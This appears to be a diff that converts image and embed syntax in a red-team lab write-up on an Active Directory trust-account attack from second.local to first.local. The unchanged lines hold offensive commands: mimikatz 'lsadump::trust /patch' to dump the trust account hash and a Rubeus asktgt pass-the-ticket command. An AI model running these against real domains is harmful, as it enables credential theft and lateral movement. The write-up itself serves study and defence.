@@ -27,7 +27,7 @@ In our lab, considering that `first.local` is a trusted domain trusted by the tr
 
 Visually, this looks like something like this:
 
-![Technique / attack diagram based on the one seen in https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](<../../.gitbook/assets/image (1088).png>)
+![[image (1088).png|Technique / attack diagram based on the one seen in https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted]]
 
 ## Checks
 
@@ -40,14 +40,14 @@ Confirm the trust relationships between domains:
 get-adtrust -filter *
 ```
 
-![](<../../.gitbook/assets/image (1092).png>)
+![[image (1092).png]]
 
 ```
 # on second-dc.second.local
 get-adtrust -filter *
 ```
 
-![](<../../.gitbook/assets/image (1089).png>)
+![[image (1089).png]]
 
 Confirm that there's a trust account `second$` on `first.local` domain:
 
@@ -56,7 +56,7 @@ Confirm that there's a trust account `second$` on `first.local` domain:
 get-aduser 'second$'
 ```
 
-![](<../../.gitbook/assets/image (1094).png>)
+![[image (1094).png]]
 
 Confirm that we can enumerate resources on the trusting domain `second.local` from `first.local`:
 
@@ -65,7 +65,7 @@ Confirm that we can enumerate resources on the trusting domain `second.local` fr
 get-aduser -Filter * -Server second.local -Properties samaccountname,serviceprincipalnames | ? {$_.ServicePrincipalNames} | ft
 ```
 
-![](<../../.gitbook/assets/image (1085).png>)
+![[image (1085).png]]
 
 Confirm that we cannot (just yet, but this is soon to change) enumerate resources on the trusted domain `first.local` from the trusting domain :
 
@@ -74,7 +74,7 @@ Confirm that we cannot (just yet, but this is soon to change) enumerate resource
 get-aduser -Filter * -Server first.local -Properties samaccountname,serviceprincipalnames | ? {$_.ServicePrincipalNames} | ft
 ```
 
-![](<../../.gitbook/assets/image (1091).png>)
+![[image (1091).png]]
 
 ## Compromising Trust Account first.local\second$
 
@@ -87,7 +87,7 @@ To compromise the `first.local\second$` and reveal its password hash, we can use
 mimikatz.exe "lsadump::trust /patch" "exit"
 ```
 
-![](<../../.gitbook/assets/image (1093).png>)
+![[image (1093).png]]
 
 Note the RC4 hash in `[out] first.local` -> `second.local` line - this is the NTLM hash for `first.local\second$` trust account, capture it.
 
@@ -100,7 +100,7 @@ Once we have the NTLM hash for `first.local\second$`, we can request its TGT fro
 Rubeus.exe asktgt /user:second$ /domain:first.local /rc4:24b07e26ca7affb4ac061f6920cb57ec /nowrap /ptt
 ```
 
-![](<../../.gitbook/assets/image (1095).png>)
+![[image (1095).png]]
 
 ## Accessing Resources on First.local from Second.local
 
@@ -110,8 +110,8 @@ At this point on `second-dc.second.local`, we have a TGT for `first.local\second
 Get-ADUser roast.user -Server first.local -Properties * | select samaccountname, serviceprincipalnames
 ```
 
-![](<../../.gitbook/assets/image (1090).png>)
+![[image (1090).png]]
 
 ## References
 
-{% embed url="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted" %}
+[improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)
